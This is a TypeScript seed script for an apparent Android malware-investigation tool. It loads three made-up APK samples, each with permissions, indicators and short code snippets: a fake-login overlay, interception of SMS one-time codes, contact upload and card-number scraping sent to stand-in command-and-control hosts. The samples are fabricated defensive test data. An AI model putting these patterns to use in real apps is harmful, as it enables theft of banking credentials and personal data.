import { runInvestigation } from "../src/lib/investigator";
import { db, investigationsTable } from "@workspace/db";

const samples = [
  {
    sampleName: "FastBank-Mobile-2.4.7.apk",
    sha256: "a3f9d7e2b4c8917f3e0b6d8a5c2917eaf04b1c8d72f9a83b6e51d7c08f49a261",
    fuzzyHash: "T1B5C2A98E2F8C71B5E8C8A52F1E9D3C7B6A0F8E2D9C7B6A5F8E2D9C7B6A5F8E",
    packageName: "com.fastbank.mobile",
    versionName: "2.4.7",
    targetSdk: 33,
    compileSdk: 34,
    permissions: [
      "android.permission.READ_SMS",
      "android.permission.RECEIVE_SMS",
      "android.permission.SEND_SMS",
      "android.permission.READ_CONTACTS",
      "android.permission.SYSTEM_ALERT_WINDOW",
      "android.permission.BIND_ACCESSIBILITY_SERVICE",
      "android.permission.READ_PHONE_STATE",
      "android.permission.INTERNET",
      "android.permission.WAKE_LOCK",
      "android.permission.REQUEST_INSTALL_PACKAGES",
    ],
    codeSnippets: `class OverlayService extends AccessibilityService {
  void onAccessibilityEvent(AccessibilityEvent e) {
    if (e.getPackageName().equals("com.realbank.app")) {
      WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
      View overlay = inflater.inflate(R.layout.fake_login, null);
      wm.addView(overlay, params);
    }
  }
}

void onSmsReceived(SmsMessage msg) {
  String body = msg.getMessageBody();
  if (body.matches(".*\\\\d{4,8}.*")) {
    HttpClient.post("https://api-secure-update.com/c2/sms", body);
    abortBroadcast();
  }
}`,
    urls: [
      "https://api-secure-update.com/c2/checkin",
      "https://api-secure-update.com/c2/sms",
      "https://cdn-fastbank.xyz/payload.dex",
    ],
    domains: ["api-secure-update.com", "cdn-fastbank.xyz", "metrics-tracker.io"],
    ipAddresses: ["185.244.25.171", "45.142.213.99"],
    apiKeys: ["AIzaSyC-fakeKey-DemoExample123456"],
    phoneNumbers: ["+12025550173"],
    certificateFingerprint: "9F:8E:7D:6C:5B:4A:39:28:17:06:F5:E4:D3:C2:B1:A0:99:88:77:66",
    certificateSubject: "CN=Unknown, OU=Dev, O=Unknown, L=Unknown, ST=Unknown, C=US",
    certificateIssuer: "CN=Unknown, OU=Dev, O=Unknown, L=Unknown, ST=Unknown, C=US",
    certificateNotBefore: "2025-08-12T00:00:00Z",
    certificateNotAfter: "2055-08-12T00:00:00Z",
    virusTotalScore: 47,
    virusTotalTotal: 71,
    abuseIpdbScore: 92,
    urlScanScore: 88,
    clusterId: "CLUSTER-ANUBIS-X4",
    anomalyScore: 0.91,
    gnnMaliciousProb: 0.97,
    pageRankScore: 0.84,
  },
  {
    sampleName: "PhotoMagicEditor-1.0.3.apk",
    sha256: "b8e1c4f72a930d6b5f8c0a1e2d3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f",
    fuzzyHash: "T1A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E9F0A1",
    packageName: "com.photomagic.editor",
    versionName: "1.0.3",
    targetSdk: 31,
    compileSdk: 33,
    permissions: [
      "android.permission.INTERNET",
      "android.permission.READ_EXTERNAL_STORAGE",
      "android.permission.WRITE_EXTERNAL_STORAGE",
      "android.permission.READ_CONTACTS",
      "android.permission.ACCESS_FINE_LOCATION",
      "android.permission.CAMERA",
      "android.permission.RECORD_AUDIO",
    ],
    codeSnippets: `void uploadContacts() {
  Cursor c = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
  JSONArray arr = new JSONArray();
  while (c.moveToNext()) { arr.put(buildContact(c)); }
  HttpClient.post("https://leads-collector.top/upload", arr.toString());
}`,
    urls: ["https://leads-collector.top/upload", "https://leads-collector.top/ping"],
    domains: ["leads-collector.top", "ad-track-pixel.net"],
    ipAddresses: ["91.218.114.42"],
    apiKeys: [],
    phoneNumbers: [],
    certificateFingerprint: "11:22:33:44:55:66:77:88:99:AA:BB:CC:DD:EE:FF:00:11:22:33:44",
    certificateSubject: "CN=Photo Studios, O=Photo Studios, C=RU",
    certificateIssuer: "CN=Photo Studios, O=Photo Studios, C=RU",
    certificateNotBefore: "2024-11-01T00:00:00Z",
    certificateNotAfter: "2026-11-01T00:00:00Z",
    virusTotalScore: 18,
    virusTotalTotal: 71,
    abuseIpdbScore: 45,
    urlScanScore: 52,
    clusterId: "CLUSTER-ADWARE-PHOTO-09",
    anomalyScore: 0.62,
    gnnMaliciousProb: 0.71,
    pageRankScore: 0.31,
  },
  {
    sampleName: "TaxRefund-Helper-3.1.apk",
    sha256: "c4d7e9f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9",
    fuzzyHash: "T1C4D7E9F1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0B1C2D3E4F5A6B7C8",
    packageName: "gov.tax.refund.helper",
    versionName: "3.1",
    targetSdk: 33,
    compileSdk: 34,
    permissions: [
      "android.permission.READ_SMS",
      "android.permission.RECEIVE_SMS",
      "android.permission.SYSTEM_ALERT_WINDOW",
      "android.permission.BIND_ACCESSIBILITY_SERVICE",
      "android.permission.GET_ACCOUNTS",
      "android.permission.READ_CONTACTS",
      "android.permission.INTERNET",
      "android.permission.RECEIVE_BOOT_COMPLETED",
      "android.permission.QUERY_ALL_PACKAGES",
      "android.permission.REQUEST_INSTALL_PACKAGES",
    ],
    codeSnippets: `String getCardData() {
  AccessibilityNodeInfo root = getRootInActiveWindow();
  AccessibilityNodeInfo card = root.findAccessibilityNodeInfosByViewId("com.bank/cardNumber").get(0);
  return card.getText().toString();
}

void exfil(String d) {
  byte[] enc = AES.encrypt(d, KEY);
  HttpClient.post("https://tax-refund-helper.click/data", Base64.encode(enc));
}`,
    urls: [
      "https://tax-refund-helper.click/data",
      "https://tax-refund-helper.click/cmd",
      "https://api-secure-update.com/c2/checkin",
    ],
    domains: ["tax-refund-helper.click", "api-secure-update.com"],
    ipAddresses: ["185.244.25.171", "194.180.48.231"],
    apiKeys: [],
    phoneNumbers: ["+447700900123"],
    certificateFingerprint: "9F:8E:7D:6C:5B:4A:39:28:17:06:F5:E4:D3:C2:B1:A0:99:88:77:66",
    certificateSubject: "CN=Unknown, OU=Dev, O=Unknown, L=Unknown, ST=Unknown, C=US",
    certificateIssuer: "CN=Unknown, OU=Dev, O=Unknown, L=Unknown, ST=Unknown, C=US",
    certificateNotBefore: "2025-09-04T00:00:00Z",
    certificateNotAfter: "2055-09-04T00:00:00Z",
    virusTotalScore: 54,
    virusTotalTotal: 71,
    abuseIpdbScore: 95,
    urlScanScore: 91,
    clusterId: "CLUSTER-ANUBIS-X4",
    anomalyScore: 0.94,
    gnnMaliciousProb: 0.98,
    pageRankScore: 0.89,
  },
];

async function main() {
  const existing = await db.select().from(investigationsTable);
  if (existing.length > 0) {
    console.log(`Already seeded with ${existing.length} investigations. Skipping.`);
    process.exit(0);
  }

  for (const sample of samples) {
    console.log(`Investigating ${sample.sampleName}...`);
    const result = await runInvestigation(sample);
    await db.insert(investigationsTable).values({
      ...sample,
      verdict: result.verdict,
      riskLevel: result.riskLevel,
      riskScore: result.riskScore,
      confidence: result.confidence,
      primaryThreatType: result.primaryThreatType,
      analysis: result.analysis,
    });
    console.log(`  -> ${result.verdict} / ${result.riskLevel} / score ${result.riskScore}`);
  }
  console.log("Seed complete.");
  process.exit(0);
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
